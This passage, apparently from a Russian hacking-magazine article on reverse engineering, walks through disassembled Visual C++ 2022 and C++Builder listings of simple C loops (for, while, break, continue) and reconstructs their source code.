с предусловием, однако не будем торопить ся с выводами. Ведь мы еще не
встретили ни одной перек рестной ссылки!


                cmp     cs:_ZN14While_repeat_d1aE, 0Ah
; Если (a >= 0xA), пропускаем последующий цикл и переходим к
следующему блоку кода
                jge     short loc_428FA2
loc_428F72:                              ; CODE XREF:
_ZN14While_repeat_d14initializationEv+60↓j
; Перекрестная ссылка говорит нам о начале цикла
; Ниже идет блок кода для вывода строки, не будем на нем подробно
останавливаться...
                mov     rcx, cs:off_431F40
                lea     rdx, dword_42900C
                call
_ZN6System14_Write0UStringERNS_8TTextRecENS_13UnicodeStringE
                mov     rcx, rax
                call    _ZN6System8_WriteLnERNS_8TTextRecE
                call    _ZN6System8__IOTestEv
; ... здесь он заканчивается и переменная а увеличивается на 1
                add     cs:_ZN14While_repeat_d1aE, 1
; Сверка получившегося значения с 0xA, значит, все-таки имеем
цикл с постусловием,
; компилятор изменил цикл с предусловием, который был в исходном
коде!
                cmp     cs:_ZN14While_repeat_d1aE, 0Ah
; Если (a < 0xA), прыгаем назад в начало цикла
                jl      short loc_428F72
loc_428FA2:                              ; CODE XREF:
_ZN14While_repeat_d14initializationEv+30↑j

Сюда происходит переход после завершения предыду щего цик ла, а так же
в слу чае, если при проверке перед входом в цикл оказывается, что перемен ная
a боль ше значения 0хА либо равна ему.


                nop
loc_428FA3:                              ; CODE XREF:
_ZN14While_repeat_d14initializationEv+91↓j
; Перекрестная ссылка — явный намек на начало цикла
; Он начинается с блока кода вывода строки, значит, имеем дело с
циклом с постусловием
                mov     rcx, cs:off_431F40
                lea     rdx, dword_429044
                call
_ZN6System14_Write0UStringERNS_8TTextRecENS_13UnicodeStringE
                mov     rcx, rax
                call    _ZN6System8_WriteLnERNS_8TTextRecE
                call    _ZN6System8__IOTestEv
; Уменьшаем значение переменной a на 1
                sub     cs:_ZN14While_repeat_d1aE, 1
; Сравниваем ее значение с нулем
                cmp     cs:_ZN14While_repeat_d1aE, 0
; Если (a >= 0), переходим в начало цикла...
                jge     short loc_428FA3
; когда переменная примет значение меньше нуля,
; выполняем блок кода завершения приложения
                call    _ZN6System6_Halt0Ev
; --------------------------------
                jmp     short loc_428FE2
; --------------------------------
                align 4
                call    _ZN6System19_UnhandledExceptionEv
; --------------------------------
                align 2
loc_428FE2:                              ; CODE XREF:
_ZN14While_repeat_d14initializationEv+98↑j
                lea     rsp, [rbp+20h]
                pop     rbp
                retn
; } // starts at 428F40
_ZN14While_repeat_d14initializationEv endp

Как оказалось, оптимизирован ный вариант ничем не отличает ся от текущего,
поэтому рассмат ривать первый нет никакого смысла. Лучше перейдем к сле-
дующему типу цик лов.


ÖÈÊËÛ FOR
Visual C++ 2022 áåç îïòèìèçàöèè
Рассмот рим следующий пример for_cycle:


#include <stdio.h>


int main()
{
    int a;


    for (a = 0; a < 10; a++)
        printf("Оператор цикла for\n");
}





                  Вы вод приложения for_cycle

Резуль тат ком пиляции Microsoft Visual C++ 2022 с отключен ной оптимизацией
будет выг лядеть так:


; int __cdecl main(int argc, const char **argv, const char **envp)
main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
0000000140004018↓o
; Объявляем локальную переменную
var_18           = dword ptr -18h
; Резервируем для нее место в стеке
                sub     rsp, 38h
; Инициализируем переменную a нулем
                mov     [rsp+38h+var_18], 0
; Непосредственный переход на код проверки условия продолжения
цикла —
; характерный признак цикла for
                jmp     short loc_1400010F8
; --------------------------------
loc_1400010EE:                           ; CODE XREF: main+2B↓j
; Загрузка в EAX значение переменной a
                mov     eax, [rsp+38h+var_18]
; Увеличение EAX на единицу
                inc     eax
; Обновление переменной a. Следовательно, исходный код выглядел
так: a++
                mov     [rsp+38h+var_18], eax
loc_1400010F8:                           ; CODE XREF: main+C↑j
; Сравниваем переменную a со значением 0xA
                cmp     [rsp+38h+var_18], 0Ah
; Выходим из цикла, если a >= 0xA
                jge     short loc_14000110D
; Иначе продолжаем выполнение и выводим строку
                lea     rcx, _Format    ; _Format
                call    printf
; Безусловный переход в начало цикла
                jmp     short loc_1400010EE
; --------------------------------
loc_14000110D:                           ; CODE XREF: main+1D↑j
                xor     eax, eax
                add     rsp, 38h
                retn
main            endp

Итак, что мы имеем?





Расположен ная в начале цик ла проверка на завершение говорит о том, что
это цикл с предусловием, но непосредствен но выразить его через while
не удается: мешает безусловный переход в середину цик ла, минуя код инкре-
мен та перемен ной var_18. Однако этот цикл с лег костью отображается
на оператор for, смот ри:


  for (int a = 0; a < 0xA; a++) printf("Оператор циклаfor\n");

Действитель но, цикл for сначала инициирует перемен ную-счет чик, затем про-
веряет условие продолжения цик ла (оптимизируемое ком пилятором в условие
завершения), далее выполняет оператор цик ла, модифициру ет счет чик, вновь
проверяет условие и так далее.


Visual C++ 2022 ñ ïðèìåíåíèåì îïòèìèçàöèè
А теперь задейству ем оптимизацию и посмотрим, как видоизменит ся наш
цикл:


; int __cdecl main(int argc, const char **argv, const char **envp)
main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
000000014000400C↓o
                push    rbx
                sub     rsp, 20h
; Инициализируем регистровую переменную-счетчик
; Внимание! В исходном коде начальное значение счетчика равнялось
нулю!
                mov     ebx, 0Ah
                nop     dword ptr [rax+rax+00h]
loc_140001080:                           ; CODE XREF: main+20↓j

Вы полняем оператор цик ла! Причем безо всяких проверок! Хит рый ком пилятор
проанализировал код и понял, что цикл выполняет ся по крайней мере один
раз.


            lea     rcx, _Format    ; _Format
            call    printf

Умень шаем счет чик, хотя в исходном коде прог раммы мы его увеличивали.
Ну правиль но: sub reg, const / jnz xxx короче, чем: INC / CMP reg,
const / jnz xxx.
  Ой и муд рит ком пилятор! Кто же ему давал право так изменять цикл?!
А дело вот в чем: он понял, что параметр цик ла в самом цик ле исполь зует ся
толь ко как счет чик и нет никакой разницы, увеличивает ся он с каждой итераци-
ей или умень шает ся.


                sub     rbx, 1
; Переход в начало цикла, если RBX > 0
                jnz     short loc_140001080
                xor     eax, eax
                add     rsp, 20h
                pop     rbx
                retn
main            endp

Внеш не это типичный код следующего вида:


int a = 0xA;
do {
      printf("Оператор цикла while\n");
} while (--a);

Если тебя устраивает читабель ность такой формы записи, оставляй ее. Если же
нет, тог да код можно пред ставить так:


  for (int a = 0; a < 10; a++) printf("Оператор цикла for\n");

Постой, постой! На каком основании мы выполнили такое преобразование?
А на том же самом, что и ком пилятор: раз параметр цик ла исполь зует ся толь ко
как счет чик, закон на любая запись, выполняющая цикл ровно десять раз. Оста-
ется выбрать ту, которая удобнее и красивее. Ник то же не будет утверждать,
что for (a = 10; a > 0; a--) более привычно, чем for (a = 0; a < 10;
a++)?


C++Builder 10
А что покажет нам товарищ C++Builder без оптимизации? Ком пилиру ем
и смот рим пример for_cycle:


main            proc near                ; DATA XREF:
__acrtused+29↑o
; Со стула упасть можно! пять переменных для маленького цикла!
var_18           = dword ptr -18h
var_14           = dword ptr -14h
var_10           = qword ptr -10h
var_8            = dword ptr -8
var_4            = dword ptr -4
                push    rbp
                sub     rsp, 40h
                lea     rbp, [rsp+40h]
; Инициализация переменных
                mov     [rbp+var_4], 0
                mov     [rbp+var_8], ecx
                mov     [rbp+var_10], rdx
                mov     [rbp+var_14], 0
loc_40141F:                              ; CODE XREF: main+3D↓j

После инициализации перемен ных сразу следует начало цик ла, где на первом
месте нас ожидает проверка перемен ной a. Из этого следует, что C++Builder
цикл for превратил в цикл while с предусловием.


                cmp     [rbp+var_14], 0Ah
                jge     short loc_40143F
; Если (a >= 0xA), выходим из цикла
                lea     rcx, aOperatorIklaFo ; "Оператор цикла
for\n"
; Выводим строку
                call    printf
                mov     [rbp+var_18], eax
; Копируем в EAX значение переменной a
                mov     eax, [rbp+var_14]
; Увеличиваем значение в регистре на 1
                add     eax, 1
; Возвращаем его в переменную
                mov     [rbp+var_14], eax
; Безусловный переход в начало цикла
                jmp     short loc_40141F
; --------------------------------
loc_40143F:                              ; CODE XREF: main+23↑j
; Блок завершения программы
                mov     [rbp+var_4], 0
                mov     eax, [rbp+var_4]
                add     rsp, 40h
                pop     rbp
                retn
main            endp

Вид но, что C++Builder 10 не дотягивает до Visual C++ 2022. Ему даже не хва-
тило ума проверить, выполняет ся ли цикл хотя бы один раз, чтобы превратить
цикл for в цикл с постусловием. Вместо этого он сделал цикл с предусловием,
однако заменил условие продолжения выполнения на условие прек ращения!
  С включен ной оптимизацией C++Builder ком пилиру ет цикл for точно так
же, как цик лы while и do. То есть выкиды вает любое упоминание о цик ле
и просто десять раз выводит задан ную строчку.


ÖÈÊËÛ Ñ ÓÑËÎÂÈÅÌ Â ÑÅÐÅÄÈÍÅ
Èäåíòèôèêàöèÿ break
Теперь настала очередь цик лов с условием в середине или цик лов, завер-
шаемых вручную оператором break. Рассмот рим следующий пример.


#include <stdio.h>


int main()
{
    int a = 0;


    while (1)
    {
        printf("1-й оператор\n");
        if (++a > 2) break;
        printf("2-й оператор\n");
    }


    do
    {
        printf("1-й оператор\n");
        if (--a < 0) break;
        printf("2-й оператор\n");
    }
    while (1);
}





                Вы вод приложения cycle_break_vc


Visual C++ 2022 áåç îïòèìèçàöèè
Резуль тат ком пиляции в Visual C++ 2022 с отключен ной оптимизацией должен
выг лядеть так (пример cycle_break_vc):


; int __cdecl main(int argc, const char **argv, const char **envp)
main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
0000000140004018↓o
var_a           = dword ptr -18h
; Резервируем место для единственной локальной переменной
                sub     rsp, 38h
; Присваиваем переменной var_a значение 0
                mov     [rsp+38h+var_a], 0
; Перекрестная ссылка, направленная вниз, — цикл
loc_1400010EC:                           ; CODE XREF: main+3E↓j
; Обнуляем регистр EAX
                xor     eax, eax

Обрати внимание: ког да оптимизация отключена, ком пилятор тран слирует
безусловный цикл «слиш ком бук валь но». Так, обну лив EAX, он педан тично про-
веряет его значение на равенство единице, чего произойти не может! Если
в кои-то веки FALSE будет равно TRUE — произойдет выход из цик ла.
  Словом, все эти инструк ции — глу пый и бесполезный код цик ла while (1)!


                cmp     eax, 1
; Если операнды одинаковые, то результат станет 0 и будет
возведен флаг нуля,
; в результате чего произойдет выход из цикла
                jz      short loc_140001120
; printf("1-й оператор\n")
                lea     rcx, _Format    ; "1-й"
                call    printf
; В EAX помещаем значение переменной a
                mov     eax, [rsp+38h+var_a]
; Инкрементируем EAX
                inc     eax
; Возвращаем значением из EAX в переменную var_a
                mov     [rsp+38h+var_a], eax
; Сравниваем значение переменной var_a с константой 2 — пределом
цикла
                cmp     [rsp+38h+var_a], 2




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ





              ПРАКТИКУЕМСЯ В ПОИСКЕ ЦИКЛОВ ПРИ
                                       РЕВЕРСЕ




Переход выполняет ся, если (var_a <= 0x2). Но куда ведет этот переход?
Во-первых, переход направлен вниз, то есть это уже не переход к началу цик-
ла. Следователь но, и условие — не условие цик ла, а резуль тат ком пиляции
конструк ции IF — THEN. Второе — переход пры гает на первую коман ду, сле-
дующую за безусловным jmp short loc_140001120. А тот передает управле-
ние инструк ции, следующей за коман дой jmp short loc_1400010EC — безус-
ловного перехода, направлен ного вверх, — в начало цик ла. Следователь но,
jmp  short  loc_140001120 осу щест вляет выход из цик ла, а jle  short
loc_140001112 продолжает его выполнение.


                jle     short loc_140001112

Ниже идет переход на завершение цик ла. А кто у нас завершает цикл? Ну
конечно же, break! Следователь но, окон чатель ная деком пиляция выг лядит
так: if (++var_a > 0x2) break;.
  Мы инвертировали <= в >, так как JLE передает управление на код продол-
жения цик ла, а вет ка THEN в нашем слу чае — на break.


                jmp     short loc_140001120
; --------------------------------
; Перекрестная ссылка направлена вверх, следовательно, это не
начало цикла
loc_140001112:                           ; CODE XREF: main+2E↑j
; printf("2-й оператор\n")
                lea     rcx, a2         ; "2-й"
                call    printf
; Прыжок в начало цикла. Вот мы и добрались до конца цикла
                jmp     short loc_1400010EC

Восстанавливаем исходный код:


while(1)
{
    printf("1-й оператор\п");
    if (++var_a > 0x2) break;
    printf("2-й оператор\n");
}


; --------------------------------


; Сюда происходит переход в момент выхода из первого цикла. По
всей видимости, это перекрестная ссылка — начало второго цикла


loc_140001120:                           ; CODE XREF: main+11↑j
                                          ; main+30↑j ...
; printf("1-й оператор\n");
                lea     rcx, a1         ; "1-й"
                call    printf
                mov     eax, [rsp+38h+var_a]
; Уменьшаем значение в EAX: --var_a
                dec     eax
                mov     [rsp+38h+var_a], eax
; После возврата значения в память сравниваем значение переменной
с нулем
                cmp     [rsp+38h+var_a], 0
; Если var_a >= 0, выполняем переход вниз
                jge     short loc_14000113F

Оператор break цик ла do ничем не отличает ся от break цик ла while! Поэтому
не будем разглаголь ствовать, а сразу его деком пилиру ем: if (var_a < 0)
break;.


; Очевидно, это break, ведущий в конец программы
                jmp     short loc_140001152
; --------------------------------
loc_14000113F:                           ; CODE XREF: main+5B↑j
                lea     rcx, a2_0       ; "2-й"
                call    printf
                xor     eax, eax
                cmp     eax, 1
; А это проверка продолжения цикла: while (1);
                jnz     short loc_140001120
loc_140001152:                           ; CODE XREF: main+5D↑j
                xor     eax, eax
                add     rsp, 38h
                retn
main            endp

Что ж, оператор break в обоих цик лах выг лядит одинаково и элемен тарно рас-
познается (правда, не с первого взгляда, но при отслеживании несколь ких
переходов — да). А вот с бесконечными цик лами неоптимизирующий ком-
пилятор под качал: получен ный код проверяет условие, истинность (неис-
тинность) которого очевид на. Интересно, как поведет себя оптимизирующий
ком пилятор?


Visual C++ 2022 ñ îïòèìèçàöèåé
Давай откомпилиру ем тот же самый пример ком пилятором Microsoft Visual
C++ 2022 с ключом /O2 (оптимизация по скорости) и посмотрим, что получит-
ся:


; int __cdecl main(int argc, const char **argv, const char **envp)
main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
000000014000400C↓o
arg_0            = qword ptr  8
; Объявляем и инициализируем аргумент
                mov     [rsp+arg_0], rbx
; Сохраняем RDI в стеке
                push    rdi
                sub     rsp, 20h
; printf("1-й оператор\n"); — выводим строку до начала
какого-либо цикла!
; Значит, компилятор предсказал хотя бы одно выполнение итерации
цикла
                lea     rcx, _Format    ; "1-й"
                call    printf
; Инициализация регистровых переменных:
                mov     ebx, 2
; Записав в EBX значение 2: var_EBX = 2, очень похожее на потолок
нашего цикла,
; копируем это значение в EDI: var_RDI = 2
                mov     edi, ebx
                nop     dword ptr [rax]
; Перекрестная ссылка, направленная вперед. Это начало цикла
loc_140001090:                           ; CODE XREF: main+3C↓j

Ага! В начале цик ла нет никаких проверок. Получается, оптимизирующий ком-
пилятор превратил цикл с предусловием в цикл с постусловием и пред сказал
еще одну выполненную итерацию. Вполне возможно, где-то в его середине
притаилось условие выхода.


; printf("2-й оператор\n");
                lea     rcx, a2D        ; "2-й"
                call    printf
; printf("1-й оператор\n");
                lea     rcx, _Format    ; "1-й"
                call    printf

Посмотри-ка! Оказывается, итерация состоит из вывода двух строк, а перед
началом цик ла была выведена толь ко одна. Значит, между коман дами печати
находит ся условие выхода из цик ла!
  Вы читаем из RDI число 1 (var_RDI--)... Постой, в исходном коде в первом
цик ле был инкремент! Такие преобразования ком пилятору ник то делать
не запрещает. Если ему кажет ся, что так быстрее, его право.


            sub     rdi, 1

Инструк ция SUB позволила не применять CMP для сравнения значений (вот тебе
и ускорение!). Если (var_RDI > 0), переходим к началу цик ла. Следователь но,
выход из цик ла произойдет, ког да выполнится условие (var_RDI <= 0).


            jnz     short loc_140001090

Как вид но, оптимизирующий ком пилятор выкинул никому не нужные проверки
условия, упростив код и облегчив его понимание. Производим деком пиляцию
первого цик ла:


var_RDI = 2;
for (;;) // Вырожденный for представляет собой бесконечный цикл
{
    printf("1-й оператор\n");
    --var_RDI;
    if (var_RDI <= 0) break;
    printf("2-й оператор\n");
}

Такой цикл явно лучше, чем while(true)!
  После кон ца первого цик ла до начала второго вызывается первый оператор
для вывода строки, точно так же, как это было в начале прог раммы:


; printf("1-й оператор\n");
                lea     rcx, _Format    ; "1-й"
                call    printf
                nop     word ptr [rax+rax+00h]
; Перекрестная ссылка — начало второго цикла
loc_1400010C0:                           ; CODE XREF: main+6B↓j
; А цикл начинаем с оператора № 2 вывода строки, подобно тому,
как это было в первом цикле
; printf("2-й оператор\n");
                lea     rcx, a2D        ; "2-й"
                call    printf
; printf("1-й оператор\n");
                lea     rcx, _Format    ; "1-й"
                call    printf
; Уменьшаем значение в регистре EBX на 1: var_EBX--
; Как мы помним, в EBX находится потолок цикла, равно как было в
RDI
                sub     ebx, 1

Переход в начало цик ла осу щест вляется, ког да флаг SF == 0. Следователь но,
выход из цик ла происходит, ког да флаг SF == 1, а он будет равен единице
толь ко в слу чае, если в резуль тате предыду щего вычитания получилось отри-
цатель ное значение.


            jns     short loc_1400010C0

Все это намекает на следующий код второго цик ла:


var_EBX = 2;
for (;;)
{
    printf("1-й оператор\n");
    --var_EBX;
    if (var_EBX < 0) break;
    printf("2-й оператор\n");
}


; Восстанавливаем регистры перед выходом
                mov     rbx, [rsp+28h+arg_0]
                xor     eax, eax
                add     rsp, 20h
                pop     rdi
                retn
main            endp

Для пред ставления бесконечных цик лов в деком пилирован ном коде мы вос-
поль зовались вырожденным for, который не имеет ни пред-, ни постусловия,
потому что дизассем блирован ный листинг не дал нам ни малейшего намека
на присутствие цик ла дру гого типа!
   Да... тут есть над чем подумать! Ком пилятор нормаль но «переварил» пер-
вую строку цик ла printf("1-й оператор\n"), а затем «напоролся» на вет вле-
ние: if (--a < 0) break. Хит рые парни из Microsoft знают, что для суперска-
лярных суперконвейерных процессоров, к которым относят ся современ ные
чипы от Intel и AMD, вет вления все равно что чертополох для Тиг ры. Вот и при-
ходит ся ком пилятору исправлять ляпы прог раммиста, что он делать в прин-
ципе не обязан, но за что ему боль шое человеческое спасибо!
  Ком пилятор как бы «прок ручивает», «слепляя» вызовы фун кций printf
и вынося вет вления в конец. Образно исполняемый код можно пред ставить
трассой, а процессор — гон щиком. Чем длин нее участок дороги без поворо-
тов, тем быстрее его проскочит гон щик. Выносить условие из середины цик ла
в его конец вполне допустимо, ведь перемен ная, относитель но которой
выполняет ся   вет вление,  не  модифициру ется  ни  фун кцией  printf,
ни какой-либо дру гой. Поэтому не все ли равно, где ее проверять? Конечно
же, не все равно!
  К момен ту, ког да условие --а < 0 становит ся истинно, успевает выпол-
нить ся первый printf, а вот второй уже не получает управления. Вот для это-
го-то ком пилятор и поместил код проверки условия следом за первым
вызовом первой фун кции printf, а затем изменил порядок вызова printf
в теле цик ла. Это привело к тому, что на момент выхода из цик ла по условию
первый printf выполняет ся на один раз боль ше, чем второй, так как он встре-
чает ся дважды.
  Ох и непросто разобрать ся во всей этой головолом ке, а пред ставь, дорогой
друг, насколь ко сложно реализовать ком пилятор, умеющий проделы вать такие
фокусы!
  А еще  кто-то ругает  автоматическую оптимизацию. Да  уж! Конечно,
руками-то можно и кру че оптимизировать (особен но понимая смысл кода),
но ведь эдак и мозги недолго вывихнуть! А ком пилятор, даже будучи стиснут
со всех сторон кривым кодом прог раммиста, за доли секун ды успевает его
доволь но прилично окуль турить!


C++Builder 10
Весь ма разитель но отличает ся тот же пример, ском пилирован ный с помощью
Embarcadero C++Builder. При этом с включен ной оптимизацией по скорости
(O2), как и в прош лые разы, получается гру да последователь ных вызовов фун-
кций вывода строк. А вот вариант без оптимизации вполне заслуживает нашего
внимания и критики:


; int __cdecl main(int argc, const char **argv, const char **envp)
                public main
main            proc near                ; DATA XREF:
__acrtused+29↑o
; Объявляется восемь локальных переменных!
var_24           = dword ptr -24h
var_20           = dword ptr -20h
var_1C           = dword ptr -1Ch
var_18           = dword ptr -18h
var_14           = dword ptr -14h
var_10           = qword ptr -10h
var_8            = dword ptr -8
var_4            = dword ptr -4
                push    rbp
                sub     rsp, 50h
                lea     rbp, [rsp+50h]
; Инициализация некоторых из них
                mov     [rbp+var_4], 0
                mov     [rbp+var_8], ecx
                mov     [rbp+var_10], rdx
                mov     [rbp+var_14], 0
; Начало первого цикла
loc_40141F:                              ; CODE XREF: main+4D↓j

Все достаточно прямолинейно: вызов оператора вывода первой строки —
printf("1-й  оператор\n"). Заметь, проверок нет, значит, все-таки ком-
пилятор переделал цикл с предусловием в цикл с постусловием или условием
в середине.


                lea     rcx, a1IOperator ; "1-й оператор\n"
                call    printf
; Регистру EDX присваиваем значение переменной var_14, а там у
нас изначально 0,
; var_EDX = 0
                mov     edx, [rbp+var_14]
; Увеличиваем значение в регистре на 1...
                add     edx, 1
; ...и возвращаем значение в память
                mov     [rbp+var_14], edx
; Сравниваем значение var_EDX с константой 2
                cmp     edx, 2
                mov     [rbp+var_18], eax
; Если (var_EDX <= 2), продолжаем выполнять цикл...
                jle     short loc_40143E
; ...иначе «выпрыгиваем» из первого цикла
                jmp     short loc_40144F
; --------------------------------
loc_40143E:                              ; CODE XREF: main+3A↑j

Продолжая выполнение первого цик ла, выводим вторую строку — printf("2-
й оператор\n"). Отчетливо вид но, что в теле цик ла, между дву мя операто-
рами вывода строк, находит ся условие для выхода из цик ла.


            lea     rcx, a2IOperator ; "2-й оператор\n"
            call    printf
            mov     [rbp+var_1C], eax
; Безусловный переход к началу первого цикла
            jmp     short loc_40141F

Резуль тиру ющая деком пиляция первого цик ла:


var_EDX = 0;
for (;;) {
    printf("1-й оператор\n");
    var_EDX++;
    if (var_EDX > 2) break;
    printf("2-й оператор\n");
}


; --------------------------------
loc_40144F:                              ; CODE XREF: main+3C↑j
                jmp     short $+2
; --------------------------------
; Начало второго цикла
loc_401451:                              ; CODE XREF: main:
loc_40144F↑j
                                          ; main+83↓j
; В начале нет условия,
; выводим надпись № 1
                lea     rcx, a1IOperator ; "1-й оператор\n"
                call    printf
; Значение переменной var_14 присваиваем регистру EDX, а в ней у
нас осталось число 2:
; var_EDX = 2
                mov     edx, [rbp+var_14]
; var_EDX = var_EDX +- 1
                add     edx, 0FFFFFFFFh
; var_14 = var_EDX
                mov     [rbp+var_14], edx
; Сравнение var_EDX с 0
                cmp     edx, 0
                mov     [rbp+var_20], eax
; Если (var_EDX >= 0), продолжаем выполнение цикла
                jge     short loc_401470
; Иначе идем в конец программы прибирать свои нули
                jmp     short loc_401487
; --------------------------------
loc_401470:                              ; CODE XREF: main+6C↑j
; В продолжение выполнения цикла выводим строку № 2
                lea     rcx, a2IOperator ; "2-й оператор\n"
                call    printf
                mov     [rbp+var_24], eax
                mov     al, 1
                test    al, 1
; Если (ZF == 0), переходим к началу второго цикла,
; в данных условиях ZF никогда не будет равна единице, так как ((
test al, 1) != 0)
                jnz     short loc_401451
; Перепрыгнув инструкцию, идем на выход
                jmp     short $+2

Итоговая деком пиляция второго цик ла:


var_EDX = 2;
for (;;) {
    printf("1-й оператор\n");
    var_EDX--;
    if (var_EDX < 0) break;
    printf("2-й оператор\n");
}


; --------------------------------
loc_401487:                              ; CODE XREF: main+6E↑j
                                          ; main+85↑j
; На выходе прибираем за собой
                mov     [rbp+var_4], 0
                mov     eax, [rbp+var_4]
                add     rsp, 50h
                pop     rbp
                retn
main            endp

Ком пилятор C++Builder при тран сляции бесконечных цик лов заменяет код
проверки условия продолжения цик ла безусловным переходом. Но вот опти-
мизировать вет вления, вынося их в конец цик ла так, как это делает Visual C++
2022, он не умеет.


Èäåíòèôèêàöèÿ continue
Теперь, после break, рассмот рим, как ком пиляторы тран слируют его «астраль-
ный антипод» — оператор continue.  Взглянем на следующий пример
(cycle_continue).


#include <stdio.h>


int main()
{
    int a = 0;


    while (a++ < 10)
    {
        if (a == 2) continue;
        printf("%x\n", a);
    }


    do
    {
        if (a == 2) continue;
        printf("%x\n", a);
    } while (--a > 0);
}





                Вы вод приложения cycle_continue


Visual C++ 2022 ñ âûêëþ÷åííîé îïòèìèçàöèåé
Резуль тат работы ком пилятора Visual C++ 2022 с отключен ной оптимизацией
будет выг лядеть так:


; int __cdecl main(int argc, const char **argv, const char **envp)
main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
0000000140004018↓o
var_a           = dword ptr -18h
var_14           = dword ptr -14h
                sub     rsp, 38h
; Присваиваем локальной переменной var_a значение 0
                mov     [rsp+38h+var_a], 0
loc_1400010EC:                           ; CODE XREF: main+2C↓j
main+3E↓j
                                     ;                 ^^^^^^^^^
^^^^^^^^^

Две перек рестные ссылки, направлен ные вперед, говорят о том, что это либо
начало двух цик лов (один из которых вложен ный), либо переход в начало цик ла
оператором continue.


; Загружаем в EAX значение var_a
                mov     eax, [rsp+38h+var_a]
; Загружаем в var_14 значение EAX
                mov     [rsp+38h+var_14], eax
                mov     eax, [rsp+38h+var_a]
; Инкрементируем значение в регистре EAX
                inc     eax
; Обновляем переменную var_a
                mov     [rsp+38h+var_a], eax
; Сравниваем значением var_a до увеличения с числом 0xA
                cmp     [rsp+38h+var_14], 0Ah
; Выход из первого цикла (переход в начало второго цикла), если
var_a >= 0xA
                jge     short loc_140001120
; Сравниваем var_a со значением 0x2
                cmp     [rsp+38h+var_a], 2

Если (var_a != 2), выполняет ся пры жок на коман ду, следующую за инструк-
цией безусловного перехода, которая направлена вверх — в начало цик ла.
Очень похоже на условие выхода из цик ла, но не будем спешить с выводами!
Вспом ним, в начале цик ла нам встретились две перек рестные ссылки. Безус-
ловный переход jmp short loc_1400010EC как раз образует одну из них. А кто
«отвечает» за дру гую? Чтобы это  узнать, необходимо проанализировать
осталь ной код цик ла.


            jnz     short loc_14000110E

Направлен ный в начало цик ла безусловный переход — это либо конец цик ла,
либо continue. Пред положим, что это конец цик ла. Тог да что же пред ставляет
собой jge short loc_140001120? Предусловие выхода из цик ла? Не похоже,
в таком слу чае оно пры гало бы гораздо «ближе» — на мет ку loc_14000110E.
  А может, jge short loc_140001120 — предусловие одного цик ла, а jnz
short loc_14000110E — постусловие дру гого, вложен ного в него? Вполне
возможно, но маловероят но: в этом слу чае постусловие пред ставляло бы
собой условие продолжения, а не завершения цик ла. Поэтому с некоторой
долей неуверен ности мы можем принять конструк цию: CMP var_a, 2 \ JNZ
loc_14000110E \ JMP loc_1400010EC за if (a == 2) continue.


                jmp     short loc_1400010EC
; --------------------------------
loc_14000110E:                           ; CODE XREF: main+2A↑j
                mov     edx, [rsp+38h+var_a]
; printf("%x\n", a);
                lea     rcx, _Format    ; "%x\n"
                call    printf

А вот это явно конец цик ла, так как jmp short loc_1400010EC — самая пос-
ледняя ссылка на начало цик ла. Итак, подытожим. Расположен ное в начале
цик ла условие кру тит этот цикл до тех пор, пока var_a < 0xA, причем инкре-
мент парамет ра цик ла происходит до его сравнения. Затем следует еще одно
условие, возвращающее управление в начало цик ла, если var_a == 2. Строй
замыкает оператор цик ла printf и безусловный переход в его начало.


            jmp     short loc_1400010EC

Таким образом, получается следующая картина.





                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ





              ПРАКТИКУЕМСЯ В ПОИСКЕ ЦИКЛОВ ПРИ
                                       РЕВЕРСЕ




Условие «ближнего» продолжения не может быть кон цом цик ла, так как тог да
условию «далекого» выхода приш лось бы выйти аж из над лежащего цик ла,
на что ни break, ни дру гие операторы не способны. Таким образом, условие
«ближнего» продолжения может быть толь ко оператором continue, и на язы ке
C/C++ вся эта конструк ция будет выг лядеть так:


while(a++ < 10)           // <- инкремент var_a и условие
далекого выхода
{
    if (a == 2) continue; // <- условие «ближнего» продолжения
    printf("%x\n",var_a); // <- тело цикла
}                          // <- безусловный переход на начало
цикла


; --------------------------------
loc_140001120:                           ; CODE XREF: main+23↑j
main+68↓j
                               ;                     ^^^^^^^^^
^^^^^^^^^
; Начало цикла
; Сравниваем переменную var_a с числом 0х2
                cmp     [rsp+38h+var_a], 2
; Если var_a != 2, то продолжение цикла
                jnz     short loc_140001129
; Переход к коду проверки условия продолжения цикла
                jmp     short loc_140001139


; Это, бесспорно, continue, и вся конструкция выглядит так:
; if (a == 2) continue;


; --------------------------------
loc_140001129:                           ; CODE XREF: main+45↑j
                mov     edx, [rsp+38h+var_a]
; printf("%x\n",var_a);
                lea     rcx, asc_140002254 ; "%x\n"
                call    printf
loc_140001139:                           ; CODE XREF: main+47↑j
                mov     eax, [rsp+38h+var_a]
; var_a--;
                dec     eax
; Обновление переменной в памяти значением из регистра
                mov     [rsp+38h+var_a], eax
; Сравнение var_a с нулем
                cmp     [rsp+38h+var_a], 0
; Пока (var_a > 0), продолжать цикл
                jg      short loc_140001120

Похоже на постусловие. В таком слу чае исходный код должен выг лядеть так:


do
{
    if (a == 2) continue;
    printf("%x\n", var_a);
} while (--var_a > 0);


    xor     eax, eax
            add     rsp, 38h
            retn
main            endp


Visual C++ 2022 ñ âêëþ÷åííîé îïòèìèçàöèåé
А теперь посмотрим, как повлияла оптимизация (/O2) на вид цик лов:


; int __cdecl main(int argc, const char **argv, const char **envp)
main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
000000014000400C↓o
                push    rbx
                sub     rsp, 20h
; Обнуление EBX: var_EBX = 0
                xor     ebx, ebx
loc_140001078:                           ; CODE XREF: main+20↓j
; Начало цикла:
; var_EBX++
                inc     ebx
; Сравнение var_EBX с 2
                cmp     ebx, 2
; Переход на метку loc_14000108D, если var_EBX == 2
                jz      short loc_14000108D
                mov     edx, ebx
; Если не ушли на метку в случае var_EBX != 2, выводим var_EBX на
экран:
; printf("%x\n", var_EBX);
                lea     rcx, _Format    ; "%x\n"
                call    printf

Следователь но, эту вет ку кода можно изобразить так:


    "if (var_EBX ! = 2) printf("%x\n", var_EBX);"


loc_14000108D:                           ; CODE XREF: main+D↑j
                cmp     ebx, 0Ah
; Продолжение цикла, пока (var_EBX++ < 0xA)
